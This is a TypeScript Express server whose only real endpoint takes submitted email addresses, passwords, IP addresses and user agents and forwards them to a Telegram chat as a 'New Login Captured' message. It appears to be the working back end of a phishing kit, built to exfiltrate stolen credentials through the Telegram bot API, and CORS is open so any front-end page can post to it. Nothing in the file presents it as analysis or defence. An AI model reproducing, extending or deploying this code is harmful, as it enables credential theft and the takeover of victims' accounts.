import express, { Request, Response } from 'express';
import axios from 'axios';
import cors from 'cors';  // Import the cors package

const app = express();

// Middleware
app.use(cors());  // Enable CORS for all routes
app.use(express.json());

// Environment variables
// TELEGRAM_BOT_TOKEN: Server-only secret (NO REACT_APP_ prefix - stays private)
// REACT_APP_CHAT_ID: Can be public (it's just a number)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.REACT_APP_CHAT_ID;

// API endpoint for sending login data to Telegram
app.post('/api/send-telegram', async (req: Request, res: Response) => {
  try {
    // Validate required environment variables
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram credentials:', {
        token: TELEGRAM_BOT_TOKEN ? 'present' : 'missing',
        chatId: TELEGRAM_CHAT_ID ? 'present' : 'missing'
      });
      return res.status(500).json({
        error: 'Telegram credentials not configured',
        message: 'TELEGRAM_BOT_TOKEN or REACT_APP_CHAT_ID is missing in environment'
      });
    }

    const { email, password, ip, userAgent, name } = req.body;

    // Validate incoming data
    if (!email || !password) {
      return res.status(400).json({
        error: 'Missing required fields',
        message: 'email and password are required'
      });
    }

    // Format the message for Telegram
    const telegramMessage = `
🔐 <b>New Login Captured</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${name || email}
📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}
🌐 <b>IP Address:</b> ${ip || 'Unknown'}
🖥️ <b>User Agent:</b> ${userAgent || 'Unknown'}
⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    // Send to Telegram using the bot API
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await axios.post(telegramApiUrl, {
      chat_id: TELEGRAM_CHAT_ID,
      text: telegramMessage,
      parse_mode: 'HTML'
    });

    // Return success response to client
    return res.status(200).json({
      success: true,
      message: 'Login data sent successfully',
      telegramMessageId: response.data.result.message_id
    });

  } catch (error) {
    console.error('Error sending Telegram message:', error);

    // Don't expose sensitive details to client
    return res.status(500).json({
      error: 'Failed to send notification',
      message: 'An error occurred while processing your request'
    });
  }
});

// Health check endpoint
app.get('/api/health', (req: Request, res: Response) => {
  res.status(200).json({ status: 'Server is running' });
});

// Start server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
